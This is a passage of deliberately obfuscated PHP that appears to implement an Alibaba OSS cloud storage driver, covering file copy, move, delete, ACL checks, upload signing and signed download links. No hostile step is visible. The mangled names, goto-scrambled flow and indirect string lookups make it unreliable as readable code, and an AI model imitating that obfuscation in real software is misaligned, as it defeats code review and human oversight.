$this->client->uploadPartCopy($this->bucket, $cÑæàÔÎÂ‰, $this->bucket, $this->pathEncode($BïáéÃ©ëì), $eŒé‰›º¦ , $aÄì…¬Šåˆ, $bÕæ¶ß‡«); $eŒé‰›º¦  = $eŒé‰›º¦  + 1; } goto b…¶ÒË‹´; bƒóñ¨Ğ‘ˆ: $eŒé‰›º¦  = 1; $cˆÁÀ± = 0; $E½¬·´§¾´ = array(); goto C½‡£Íší¤; a¿ºÔÔßÃÆ: $cÚÔ½¯‘Ş = array(); if ($CÁ·‚ò®± = $this->hashMd5($cÑæàÔÎÂ‰)) { $cÚÔ½¯‘Ş = array(OSS\OssClient::OSS_HEADERS => array($E»‹øîø™”[1187] => $CÁ·‚ò®±)); } $aÄì…¬Šåˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BïáéÃ©ëì), $cÚÔ½¯‘Ş); goto bƒóñ¨Ğ‘ˆ; döÀ„¡àƒ®: } catch (OSS\Core\OssException $AÀœ¤×‚Ö‚) { return !1; } return !0; } public function moveFile($Dâ•Õ˜­—Ô, $b»óÙ††ã) { if ($this->copyFile($Dâ•Õ˜­—Ô, $b»óÙ††ã)) { $this->remove($Dâ•Õ˜­—Ô); return !0; } return !1; } public function delFile($e¾ïäŠø™¿) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($e¾ïäŠø™¿)); } catch (OSS\Core\OssException $C´´‚Üá·™) { return !1; } return !0; } public function delFolder($b‘™™®¤ˆ) { $e‚ÍÜÖ“¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÁÏ¤«–¡Ä = $this->fileList($b‘™™®¤ˆ); if (!empty($b‘™™®¤ˆ) && !in_array(trim($b‘™™®¤ˆ, $e‚ÍÜÖ“¶[8]) . $e‚ÍÜÖ“¶[8], $FÁÏ¤«–¡Ä[$e‚ÍÜÖ“¶[83]])) { $FÁÏ¤«–¡Ä[$e‚ÍÜÖ“¶[83]][] = trim($b‘™™®¤ˆ, $e‚ÍÜÖ“¶[8]) . $e‚ÍÜÖ“¶[8]; } foreach (array_chunk($FÁÏ¤«–¡Ä[$e‚ÍÜÖ“¶[83]], 1000) as $B‰É¢…£¢ã) { try { $this->client->deleteObjects($this->bucket, $B‰É¢…£¢ã); } catch (OSS\Core\OssException $B‡ğÄ‹è) { continue; } } return !0; } public function rename($dšóÍíø¹ñ, $fªîå‘¦ÃÏ) { return $this->renameObject($dšóÍíø¹ñ, $fªîå‘¦ÃÏ); } private function fileInfo($fÂ»ùÔ±‚‹, $D”µ¯à›¼ = array()) { goto c„ñ®’‰Í; c„ñ®’‰Í: $Cì­Ë³»é =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bõ’é¬çã™ = array($Cì­Ë³»é[28] => $this->pathThis($fÂ»ùÔ±‚‹), $Cì­Ë³»é[85] => $this->getPathOuter($fÂ»ùÔ±‚‹), $Cì­Ë³»é[29] => $Cì­Ë³»é[177], $Cì­Ë³»é[197] => 0, $Cì­Ë³»é[117] => 0, $Cì­Ë³»é[87] => 0, $Cì­Ë³»é[170] => $this->ext($fÂ»ùÔ±‚‹), $Cì­Ë³»é[198] => !0, $Cì­Ë³»é[199] => !0); if (empty($D”µ¯à›¼)) { $D…²ÅÄïãŒ = $this->objectMeta($fÂ»ùÔ±‚‹); if (!$D…²ÅÄïãŒ) { return $Bõ’é¬çã™; } $D”µ¯à›¼ = array($Cì­Ë³»é[117] => strtotime($D…²ÅÄïãŒ[$Cì­Ë³»é[1193]]), $Cì­Ë³»é[87] => $D…²ÅÄïãŒ[$Cì­Ë³»é[1194]] + 0); } goto Bƒô–ßÔİî; Bƒô–ßÔİî: if (isset($D”µ¯à›¼[$Cì­Ë³»é[87]])) { $Bõ’é¬çã™[$Cì­Ë³»é[87]] = $D”µ¯à›¼[$Cì­Ë³»é[87]]; } if (isset($D”µ¯à›¼[$Cì­Ë³»é[117]])) { $Bõ’é¬çã™[$Cì­Ë³»é[117]] = $D”µ¯à›¼[$Cì­Ë³»é[117]]; } if (isset($D”µ¯à›¼[$Cì­Ë³»é[200]]) && !trim($Bõ’é¬çã™[$Cì­Ë³»é[117]])) { $Bõ’é¬çã™[$Cì­Ë³»é[117]] = $D”µ¯à›¼[$Cì­Ë³»é[200]]; } goto D¹ßù•¯; D¹ßù•¯: return $Bõ’é¬çã™; goto BÏêÀ…†æ; BÏêÀ…†æ: } private function folderInfo($DÊ§ÉäùÎ, $f‹°Ë³Ù = array()) { $cïÈê³ÜË =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÚ®¼‚Ş±µ = array($cïÈê³ÜË[28] => $this->pathThis($DÊ§ÉäùÎ), $cïÈê³ÜË[85] => $this->getPathOuter($cïÈê³ÜË[8] . $DÊ§ÉäùÎ), $cïÈê³ÜË[29] => $cïÈê³ÜË[86], $cïÈê³ÜË[197] => 0, $cïÈê³ÜË[117] => 0, $cïÈê³ÜË[198] => !0, $cïÈê³ÜË[199] => !0); if (empty($f‹°Ë³Ù)) { $DÊ§ÉäùÎ = rtrim($DÊ§ÉäùÎ, $cïÈê³ÜË[8]) . $cïÈê³ÜË[8]; $E·šê†è¾Û = $this->objectMeta($DÊ§ÉäùÎ); if (!$E·šê†è¾Û) { return $fÚ®¼‚Ş±µ; } $f‹°Ë³Ù = array($cïÈê³ÜË[197] => $E·šê†è¾Û[$cïÈê³ÜË[1195]][$cïÈê³ÜË[1196]], $cïÈê³ÜË[117] => strtotime($E·šê†è¾Û[$cïÈê³ÜË[1193]])); } if (isset($f‹°Ë³Ù[$cïÈê³ÜË[117]])) { $fÚ®¼‚Ş±µ[$cïÈê³ÜË[117]] = $f‹°Ë³Ù[$cïÈê³ÜË[117]]; } if (isset($f‹°Ë³Ù[$cïÈê³ÜË[197]])) { $fÚ®¼‚Ş±µ[$cïÈê³ÜË[197]] = $f‹°Ë³Ù[$cïÈê³ÜË[197]]; } return $fÚ®¼‚Ş±µ; } public function listPath($d¦Î±­ğœ´, $Fê«ùä¡ìç = false) { $a”È™ÏÈƒö =& $_SERVER[¶ªÕß‚ØÁŸ]; $E ÅÊ°äÄø = $this->fileList($d¦Î±­ğœ´, $a”È™ÏÈƒö[8], !0); foreach ($E ÅÊ°äÄø[$a”È™ÏÈƒö[84]] as $B·Ê•á’Ö => $EÜ‹Î¨•º”) { $E ÅÊ°äÄø[$a”È™ÏÈƒö[84]][$B·Ê•á’Ö] = $this->folderInfo($EÜ‹Î¨•º”, $EÜ‹Î¨•º”); } foreach ($E ÅÊ°äÄø[$a”È™ÏÈƒö[83]] as $B·Ê•á’Ö => $EÜ‹Î¨•º”) { $E ÅÊ°äÄø[$a”È™ÏÈƒö[83]][$B·Ê•á’Ö] = $this->fileInfo($EÜ‹Î¨•º”[$a”È™ÏÈƒö[28]], $EÜ‹Î¨•º”); } return $E ÅÊ°äÄø; } public function has($Bµ‹Êœ®ƒ, $eÂğ»Áêä = false, $a£ŞËƒ‚Ü = true) { goto a‘ö„’Ùİ‘; e™‡äª®: return !1; goto BºÔ”Ôİ¸½; c–²•ë¦óÖ: $fë÷Î·õø = $d£Ë…ãÛ‰µ[33]; $B‘¹ˆÃîÑ = 500; $Eğ ­²›Ğ¢ = 0; goto C²ÙÆËËœ; C²ÙÆËËœ: $B¥–†‰•é = 0; while (!0) { $dŠÈ¿î³¯ = array($d£Ë…ãÛ‰µ[1184] => $d£Ë…ãÛ‰µ[8], $d£Ë…ãÛ‰µ[196] => $dŞŒ¤²‘Ù, $d£Ë…ãÛ‰µ[1185] => $B‘¹ˆÃîÑ, $d£Ë…ãÛ‰µ[1186] => $fë÷Î·õø); try { $e÷Ïï´Üé = $this->client->listObjects($this->bucket, $dŠÈ¿î³¯); } catch (OSS\Core\OssException $C˜â…Ö‘÷•) { break; } $fë÷Î·õø = $e÷Ïï´Üé->getNextMarker(); $D©É¸˜Íá‚ = $e÷Ïï´Üé->getObjectList(); $bˆ¯Ø£Û = $e÷Ïï´Üé->getPrefixList(); if ($eÂğ»Áêä) { if (count($D©É¸˜Íá‚) > 1 || count($D©É¸˜Íá‚) == 1 && $D©É¸˜Íá‚[0]->getKey() != $dŞŒ¤²‘Ù) { $Eğ ­²›Ğ¢ += count($D©É¸˜Íá‚) - 1; } if (!empty($bˆ¯Ø£Û)) { $B¥–†‰•é += count($bˆ¯Ø£Û); } if ($fë÷Î·õø === $d£Ë…ãÛ‰µ[33]) { break; } continue; } if ($a£ŞËƒ‚Ü) { if (!empty($D©É¸˜Íá‚)) { if (count($D©É¸˜Íá‚) > 1 || $D©É¸˜Íá‚[0]->getKey() != $dŞŒ¤²‘Ù) { return !0; } } } else { if (!empty($bˆ¯Ø£Û)) { return !0; } } if ($fë÷Î·õø === $d£Ë…ãÛ‰µ[33]) { break; } } if ($eÂğ»Áêä) { return array($d£Ë…ãÛ‰µ[201] => $Eğ ­²›Ğ¢, $d£Ë…ãÛ‰µ[202] => $B¥–†‰•é); } goto e™‡äª®; a‘ö„’Ùİ‘: $d£Ë…ãÛ‰µ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bµ‹Êœ®ƒ = trim($Bµ‹Êœ®ƒ, $d£Ë…ãÛ‰µ[8]); $dŞŒ¤²‘Ù = empty($Bµ‹Êœ®ƒ) ? $d£Ë…ãÛ‰µ[33] : $Bµ‹Êœ®ƒ . $d£Ë…ãÛ‰µ[8]; goto c–²•ë¦óÖ; BºÔ”Ôİ¸½: } public function listAll($B™Ô¿»ä“) { $cÏŠ‰ôº‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¡œË°½–½ = $this->fileList($B™Ô¿»ä“, $cÏŠ‰ôº‚[33], !0); $F‚Ó…µ²¨î = array(); foreach ($B¡œË°½–½[$cÏŠ‰ôº‚[83]] as $dçÈÓµÂÎˆ) { $F‚Ó…µ²¨î[$dçÈÓµÂÎˆ[$cÏŠ‰ôº‚[28]]] = $dçÈÓµÂÎˆ[$cÏŠ‰ôº‚[87]]; } return $this->listAllFiles($B™Ô¿»ä“, array_keys($F‚Ó…µ²¨î), $F‚Ó…µ²¨î); } public function canRead($fæØİ´ç¡) { $eéÙŒªÄ™£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B‚•™¤Ò” = $this->pathAcl($fæØİ´ç¡); return $B‚•™¤Ò” == $eéÙŒªÄ™£[1197] || $B‚•™¤Ò” == $eéÙŒªÄ™£[499] ? !0 : !1; } public function canWrite($Bô—Ã××ÒŒ) { $FÎ½–òŒ¬ = $this->pathAcl($Bô—Ã××ÒŒ); return $FÎ½–òŒ¬ == $_SERVER[¶ªÕß‚ØÁŸ][499] ? !0 : !1; } public function pathAcl($DŠ«Ç‡æİ) { goto F¯»Ÿíê¼Œ; F¯»Ÿíê¼Œ: $f¢Ê¼’Êíª =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bùëêÇè‹† = $this->client->getObjectAcl($this->bucket, $this->pathEncode($DŠ«Ç‡æİ)); } catch (OSS\Core\OssException $bù­Á›è) { return !1; } goto F§¸‡ÚºŞí; E—º¾¢êÚ: return $B—§ï‹íòñ; goto døŸ˜³®‘ì; F§¸‡ÚºŞí: $B—§ï‹íòñ = $bùëêÇè‹† == $f¢Ê¼’Êíª[34] ? $this->bucketAcl : $bùëêÇè‹†; if ($B—§ï‹íòñ == $f¢Ê¼’Êíª[1198]) { return $f¢Ê¼’Êíª[1197]; } if ($B—§ï‹íòñ == $f¢Ê¼’Êíª[1199]) { return $f¢Ê¼’Êíª[499]; } goto E—º¾¢êÚ; døŸ˜³®‘ì: } private function chmodPath($cÓñâËËš, $CÕäÂ ¥‡è = '') { $DæîÕğØº =& $_SERVER[¶ªÕß‚ØÁŸ]; $e¼ä‡ğ®› = empty($CÕäÂ ¥‡è) ? $DæîÕğØº[1199] : $CÕäÂ ¥‡è; $F¤ìğèÎ› = array($DæîÕğØº[34], $DæîÕğØº[195], $DæîÕğØº[1198], $DæîÕğØº[1199]); if (!in_array($e¼ä‡ğ®›, $F¤ìğèÎ›)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($cÓñâËËš), $e¼ä‡ğ®›); } catch (OSS\Core\OssException $c›èšÖ¬) { return !1; } return !0; } public function getContent($d«·„Åßó“) { return $this->fileSubstr($d«·„Åßó“, -1); } public function setContent($c«Ÿ‰§áã, $cï’”†–Ú = '') { $AŠ¯ìŠ‰Œ³ =& $_SERVER[¶ªÕß‚ØÁŸ]; try { $fˆË‘‹’Œ  = $this->trafficLimit($AŠ¯ìŠ‰Œ³[1200]); $Fİò‹‘›ù° = $this->client->putObject($this->bucket, $this->pathEncode($c«Ÿ‰§áã), $cï’”†–Ú, $fˆË‘‹’Œ ); } catch (OSS\Core\OssException $d¦«ÛËÁò±) { return !1; } $CÍ©ì•·Ÿ÷ = array($AŠ¯ìŠ‰Œ³[1187] => trim($Fİò‹‘›ù°[$AŠ¯ìŠ‰Œ³[1201]], $AŠ¯ìŠ‰Œ³[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c«Ÿ‰§áã))); $this->updateObjMeta($c«Ÿ‰§áã, $CÍ©ì•·Ÿ÷); return isset($Fİò‹‘›ù°[$AŠ¯ìŠ‰Œ³[1202]][$AŠ¯ìŠ‰Œ³[1149]]) ? (int) $Fİò‹‘›ù°[$AŠ¯ìŠ‰Œ³[1202]][$AŠ¯ìŠ‰Œ³[1149]] : strlen($Fİò‹‘›ù°); } private function updateObjMeta($FæŸì„‘ö¤, $e„ìê’Ğèê) { $FæŸì„‘ö¤ = $this->pathEncode($FæŸì„‘ö¤); try { $D…¾™šé˜ñ = array(OSS\OssClient::OSS_HEADERS => $e„ìê’Ğèê); $this->client->copyObject($this->bucket, $FæŸì„‘ö¤, $this->bucket, $FæŸì„‘ö¤, $D…¾™šé˜ñ); } catch (OSS\Core\OssException $E¹Ã¬ÓçÈï) { return !1; } return !0; } public function upload($d¼—²Ú, $B‘¬‰³´é°, $B¿ƒÚßê‚ª = false, $b»ÑØ‘…ñ = REPEAT_REPLACE) { $eõâóå‹— =& $_SERVER[¶ªÕß‚ØÁŸ]; $cìïŒîÒã = trim($d¼—²Ú, $eõâóå‹—[8]); $EÏ“Û¥Ù¿£ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($eõâóå‹—[1187] => @md5_file($B‘¬‰³´é°)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d¼—²Ú))); $EÏ“Û¥Ù¿£ = $this->trafficLimit($eõâóå‹—[1200], $EÏ“Û¥Ù¿£); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cìïŒîÒã), $B‘¬‰³´é°, $EÏ“Û¥Ù¿£); } catch (OSS\Core\OssException $c­§÷Ó»Ú) { return !1; } return $this->getPathOuter($d¼—²Ú); } public function getHost() { $CÛÓÅÙÛë‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aª¸ –‡‰Ì = explode($CÛÓÅÙÛë‡[181], parent::getHost()); return $Aª¸ –‡‰Ì[0] . $CÛÓÅÙÛë‡[181] . $this->bucket . $CÛÓÅÙÛë‡[101] . $Aª¸ –‡‰Ì[1]; } public function uploadFormData($Eˆœ¹ñŒÊá, $DÛšµóÊ»â = 3600) { goto B‹êÖ²Ÿ•Ê; fƒá•ğÈØí: $bĞ‡íà§‰¨ = base64_encode(hash_hmac($Aİù’…ƒ[227], $e…ÈŒ–’ö‡, $this->secret, !0)); $E„ƒìÖçê¹ = array($Aİù’…ƒ[1116] => $e…ÈŒ–’ö‡, $Aİù’…ƒ[1206] => $this->accessKey, $Aİù’…ƒ[1112] => $Aİù’…ƒ[1104], $Aİù’…ƒ[1207] => $bĞ‡íà§‰¨, $Aİù’…ƒ[179] => $Dôºñ†ùİ); $E„ƒìÖçê¹ = $this->trafficLimit($Aİù’…ƒ[1200], $E„ƒìÖçê¹); goto Fî¦ã”àë¶; B‘æÆÃĞåÁ: $FÒÆšÆ’Á = date($Aİù’…ƒ[1203], time() + $BèÛ«Ê‚·š); $fÈÌÂéÉÆà = new DateTime($FÒÆšÆ’Á); $CñØè—°§• = $fÈÌÂéÉÆà->format(DateTime::ISO8601); goto D­¹°ñ Ã÷; B‹êÖ²Ÿ•Ê: $Aİù’…ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!($Dôºñ†ùİ = $this->getHost())) { return !1; } $BèÛ«Ê‚·š = $DÛšµóÊ»â; goto B‘æÆÃĞåÁ; D­¹°ñ Ã÷: $fìª¢»‡²¶ = strpos($CñØè—°§•, $Aİù’…ƒ[293]); $CñØè—°§• = substr($CñØè—°§•, 0, $fìª¢»‡²¶) . $Aİù’…ƒ[1204]; $b»ìº›ÖÑŠ = 1048576000 * 5; goto aª›È¥©; Fî¦ã”àë¶: return $E„ƒìÖçê¹; goto D‡‘åÛ›î; aª›È¥©: $cÁ÷ò¸Ùç² = $this->pathFather($Eˆœ¹ñŒÊá); $A¸¢‹çò…§ = array($Aİù’…ƒ[1106] => $CñØè—°§•, $Aİù’…ƒ[1107] => array(array($Aİù’…ƒ[1205], 0, $b»ìº›ÖÑŠ), array($Aİù’…ƒ[1110], $Aİù’…ƒ[1111], $cÁ÷ò¸Ùç²))); $e…ÈŒ–’ö‡ = base64_encode(json_encode($A¸¢‹çò…§)); goto fƒá•ğÈØí; D‡‘åÛ›î: } public function multiUploadFormData($bÄÃÊÛ¬Şä, $CòÓßÕ»âö = 3600) { $fÆ‘ŠÀÃô =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!($E”ŒŒÑ¸˜£ = $this->getHost())) { return !1; } $E¸À¡¬ÖŸ = $this->trafficLimit($fÆ‘ŠÀÃô[1200]); $C´ëĞõ®©ù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÄÃÊÛ¬Şä), $E¸À¡¬ÖŸ); return array($fÆ‘ŠÀÃô[219] => $C´ëĞõ®©ù, $fÆ‘ŠÀÃô[179] => $E”ŒŒÑ¸˜£ . $fÆ‘ŠÀÃô[8] . $this->pathEncode($bÄÃÊÛ¬Şä), $fÆ‘ŠÀÃô[220] => gmdate($fÆ‘ŠÀÃô[1208]), $fÆ‘ŠÀÃô[99] => $bÄÃÊÛ¬Şä); } public function multiUploadAuthData($aª ¡ßó¾, $EÔ¼¥—åÁ = array()) { goto b™ó±–†á´; aèƒŸ™Ñ£¿: $eÀ±¬ÏÎë = $b²ÎäƒÙìó[1211] . $this->accessKey . $b²ÎäƒÙìó[4] . $Aê×†‡‚ƒ¶; if (strpos($cº˜÷ºŠé, $b²ÎäƒÙìó[223]) === 0) { $eÀ±¬ÏÎë = array($b²ÎäƒÙìó[229] => $eÀ±¬ÏÎë, $b²ÎäƒÙìó[220] => $EÚà’¸‹¬); if ($Aâ²Á¨¶±Œ) { $eÀ±¬ÏÎë = array_merge($eÀ±¬ÏÎë, $Aâ²Á¨¶±Œ); } } return $eÀ±¬ÏÎë; goto dÌâÔ‡ŞÄö; E³æ‚¤•ŞÜ: $e“¸Í†›®¿ = $aª ¡ßó¾; if (isset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[99]])) { $e“¸Í†›®¿ = $EÔ¼¥—åÁ[$b²ÎäƒÙìó[99]]; unset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[99]]); } if (isset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[221]])) { $EÔ¼¥—åÁ[$b²ÎäƒÙìó[220]] = $EÚà’¸‹¬; return $this->listUploadParts($e“¸Í†›®¿, $EÔ¼¥—åÁ); } goto Fò‘ùŞÌÏ’; B¶‘Äâã”: if (!empty($EÔ¼¥—åÁ[$b²ÎäƒÙìó[1210]])) { $Eñ½­Â¨Ä = array_merge(array($BÒ¶‚­¥Ñ¤[4]), $EÔ¼¥—åÁ[$b²ÎäƒÙìó[1210]]); sort($Eñ½­Â¨Ä); $BÒ¶‚­¥Ñ¤[4] = implode($b²ÎäƒÙìó[62], $Eñ½­Â¨Ä); } $A’Ç¾¤Ù· = implode($b²ÎäƒÙìó[62], $BÒ¶‚­¥Ñ¤); $Aê×†‡‚ƒ¶ = base64_encode(hash_hmac($b²ÎäƒÙìó[227], $A’Ç¾¤Ù·, $this->secret, !0)); goto aèƒŸ™Ñ£¿; b™ó±–†á´: $b²ÎäƒÙìó =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÚà’¸‹¬ = isset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[220]]) ? $EÔ¼¥—åÁ[$b²ÎäƒÙìó[220]] : gmdate($b²ÎäƒÙìó[1208]); $cº˜÷ºŠé = isset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[170]]) ? $EÔ¼¥—åÁ[$b²ÎäƒÙìó[170]] : $b²ÎäƒÙìó[33]; goto E³æ‚¤•ŞÜ; Fò‘ùŞÌÏ’: $BÒ¶‚­¥Ñ¤ = array($b²ÎäƒÙìó[222], $b²ÎäƒÙìó[33], $b²ÎäƒÙìó[126], $EÚà’¸‹¬, "\170\x2d\157\x73\x73\55\x64\x61\164\145\72{$EÚà’¸‹¬}", $b²ÎäƒÙìó[8] . $this->bucket . $b²ÎäƒÙìó[8] . $e“¸Í†›®¿ . $cº˜÷ºŠé); if (strpos($cº˜÷ºŠé, $b²ÎäƒÙìó[223]) === 0) { $BÒ¶‚­¥Ñ¤[0] = $b²ÎäƒÙìó[224]; if ($Aâ²Á¨¶±Œ = $this->trafficLimit($b²ÎäƒÙìó[1200])) { $e“¸Í†›®¿ = $b²ÎäƒÙìó[1209]; array_splice($BÒ¶‚­¥Ñ¤, 5, 0, $e“¸Í†›®¿ . $b²ÎäƒÙìó[4] . $Aâ²Á¨¶±Œ[$e“¸Í†›®¿]); } } if (isset($EÔ¼¥—åÁ[$b²ÎäƒÙìó[225]]) && $EÔ¼¥—åÁ[$b²ÎäƒÙìó[225]] == $b²ÎäƒÙìó[226]) { $BÒ¶‚­¥Ñ¤[0] = $b²ÎäƒÙìó[226]; } goto B¶‘Äâã”; dÌâÔ‡ŞÄö: } public function listUploadParts($D…±„À„éš, $Cî‹‹°»•ó) { goto dò†ÎÎÜ¢; dò†ÎÎÜ¢: $aÌÃÏÛ„Ï™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e…øÒ©¢è‹ = parse_url_query($Cî‹‹°»•ó[$aÌÃÏÛ„Ï™[170]]); $c¹ĞéäÓ‘¶ = $this->client->listParts($this->bucket, $this->pathEncode($D…±„À„éš), $e…øÒ©¢è‹[$aÌÃÏÛ„Ï™[219]]); goto CâòĞãÍÅŠ; a‹Àš›¾ß: unset($Cî‹‹°»•ó[$aÌÃÏÛ„Ï™[221]], $Cî‹‹°»•ó[$aÌÃÏÛ„Ï™[225]]); $aØ®ã¤åë³ = $this->multiUploadAuthData($D…±„À„éš, $Cî‹‹°»•ó); if (empty($aØ®ã¤åë³)) { return !1; } goto eíÑÒÃ½î÷; eíÑÒÃ½î÷: return array($aÌÃÏÛ„Ï™[229] => $aØ®ã¤åë³, $aÌÃÏÛ„Ï™[220] => $Cî‹‹°»•ó[$aÌÃÏÛ„Ï™[220]], $aÌÃÏÛ„Ï™[231] => $dŠ¨¥“åŠ–); goto aÒÒòôÑš°; CâòĞãÍÅŠ: $d£“Ğ‹‹–” = $c¹ĞéäÓ‘¶->getListPart(); $dŠ¨¥“åŠ– = array(); foreach ($d£“Ğ‹‹–” as $EßÃÏñÇ•) { $dŠ¨¥“åŠ–[] = array($aÌÃÏÛ„Ï™[1191] => $EßÃÏñÇ•->getPartNumber(), $aÌÃÏÛ„Ï™[1192] => trim($EßÃÏñÇ•->getETag(), $aÌÃÏÛ„Ï™[123])); } goto a‹Àš›¾ß; aÒÒòôÑš°: } public function download($Bè¸±³, $BâÆßªëÇà) { if ($this->isFolder($Bè¸±³)) { return !1; } try { $AùŠ›õ½²‘ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $BâÆßªëÇà); $AùŠ›õ½²‘ = $this->trafficLimit($_SERVER[¶ªÕß‚ØÁŸ][115], $AùŠ›õ½²‘); $this->client->getObject($this->bucket, $this->pathEncode($Bè¸±³), $AùŠ›õ½²‘); } catch (OSS\Core\OssException $c“¢±÷İ¹) { return !1; } return $BâÆßªëÇà; } public function fileSubstr($fùÆ·¢´, $eãš ¿ö’ù = 0, $b¹Ïê„Ï‰ = false) { if ($eãš ¿ö’ù === -1) { $b°„½¶ÑÛ = array(); } else { if ($b¹Ïê„Ï‰ === !1) { $díÓÃ˜‡µÎ = $this->size($fùÆ·¢´); } else { $díÓÃ˜‡µÎ = $eãš ¿ö’ù + $b¹Ïê„Ï‰ - 1; } $b°„½¶ÑÛ = array(OSS\OssClient::OSS_RANGE => "{$eãš ¿ö’ù}\55{$díÓÃ˜‡µÎ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fùÆ·¢´), $b°„½¶ÑÛ); } catch (OSS\Core\OssException $FÍ¼óğñ—) { think_exception($FÍ¼óğñ—->getMessage()); return !1; } } private function trafficLimit($E¶˜©³Ï¦Õ, $B„±¾‚èŒ = array()) { goto A²ÂçÅ•ÖŒ; A²ÂçÅ•ÖŒ: $dğÕÎï½¥¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($E¶˜©³Ï¦Õ == $dğÕÎï½¥¤[1200] && $this->isUploadServer() || $E¶˜©³Ï¦Õ == $dğÕÎï½¥¤[115] && $this->isFileOutServer()) { return $B„±¾‚èŒ; } $Fß˜°Š½àŞ = floatval($GLOBALS[$dğÕÎï½¥¤[6]][$dğÕÎï½¥¤[94]][$dğÕÎï½¥¤[113]][$E¶˜©³Ï¦Õ]) * 1024 * 1024 * 8; goto fŞì™œŞˆÓ; fŞì™œŞˆÓ: if (!$Fß˜°Š½àŞ) { return $B„±¾‚èŒ; } $Fß˜°Š½àŞ = $Fß˜°Š½àŞ < 819200 ? 819200 : ($Fß˜°Š½àŞ > 838860800 ? 838860800 : $Fß˜°Š½àŞ); $B„±¾‚èŒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Fß˜°Š½àŞ); goto C¼Üİ‚Œ‘Ú; C¼Üİ‚Œ‘Ú: return $B„±¾‚èŒ; goto DÍ…Ğåë£Ì; DÍ…Ğåë£Ì: } public function link($eÆ›âØœ‰ˆ, $c´¨Ç²š˜ = array()) { $DŒÅ´œ–Á =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->exist($eÆ›âØœ‰ˆ) || $this->isFolder($eÆ›âØœ‰ˆ)) { return !1; } try { $c´¨Ç²š˜ = $this->trafficLimit($DŒÅ´œ–Á[115], $c´¨Ç²š˜); $b×“ÓÓ©ï = $this->client->signUrl($this->bucket, $this->pathEncode($eÆ›âØœ‰ˆ), 3600 * 12, $DŒÅ´œ–Á[226], $c´¨Ç²š˜); return $this->getCdnLink($b×“ÓÓ©ï); } catch (OSS\Core\OssException $aÍÅ©´Ç–î) { return !1; } } public function fileOut($f”Å ¨à—½, $cÛîè…¸ = false, $Dºä‘ñ« = false, $C”ÒŒ›À² = '') { goto E¯­œ«óŠã; bŒŠïÛŠ: $AŒğÚ˜íë = array(OSS\OssClient::OSS_SUB_RESOURCE => $F‘³ãä‹ÔÂ[1212] . rawurlencode("{$cÛîè…¸}\73\146\x69\154\145\156\x61\155\x65\x3d{$Dºä‘ñ«}")); $AŒğÚ˜íë[OSS\OssClient::OSS_SUB_RESOURCE] .= $F‘³ãä‹ÔÂ[1213] . rawurlencode($aØË§è¡); $b¬‹¾Şî±° = $this->link($f”Å ¨à—½, $AŒğÚ˜íë); goto CŒÙ×Ëñ ; E¯­œ«óŠã: $F‘³ãä‹ÔÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$Dºä‘ñ«) { $Dºä‘ñ« = $this->pathThis($f”Å ¨à—½); } $Dºä‘ñ« = rawurlencode($Dºä‘ñ«); goto cóÌ’˜¤±¬; CŒÙ×Ëñ : $this->fileOutLink($b¬‹¾Şî±°); goto Eã±´š±´ô; cóÌ’˜¤±¬: $aØË§è¡ = get_file_mime(get_path_ext($Dºä‘ñ«)); if ($aØË§è¡ == $F‘³ãä‹ÔÂ[211]) { return parent::fileOut($f”Å ¨à—½, $cÛîè…¸, $Dºä‘ñ«, $C”ÒŒ›À²); } $cÛîè…¸ = $cÛîè…¸ ? $F‘³ãä‹ÔÂ[212] : $F‘³ãä‹ÔÂ[213]; goto bŒŠïÛŠ; Eã±´š±´ô: } public function fileOutServer($d¤²ã¼ÈÄ°, $C¢„ÔÜªç‡ = false, $Aªà¬Ô‰¢ñ = false, $CéÙ—ˆçéâ = '') { parent::fileOut($d¤²ã¼ÈÄ°, $C¢„ÔÜªç‡, $Aªà¬Ô‰¢ñ, $CéÙ—ˆçéâ); } public function fileOutImage($DÌÅñ½ÂëÂ, $C¼ã†ÌÖíÊ = 250) { $fããÚÔ¹  = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¶ªÕß‚ØÁŸ][1214] . $C¼ã†ÌÖíÊ); $bå„ô”«×Ê = $this->link($DÌÅñ½ÂëÂ, $fããÚÔ¹ ); $this->fileOutLink($bå„ô”«×Ê); } public function fileOutImageServer($dº‚¡¢®×®, $cÙ£¢©…é = 250) { parent::fileOutImage($dº‚¡¢®×®, $cÙ£¢©…é); } public function fileOutLink($AÏğ¹Ö‚İ) { $a×†ØâÀµ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->isCdnHost() && substr($AÏğ¹Ö‚İ, 0, 7) == $a×†ØâÀµ‘[1119]) { $AÏğ¹Ö‚İ = $a×†ØâÀµ‘[1120] . 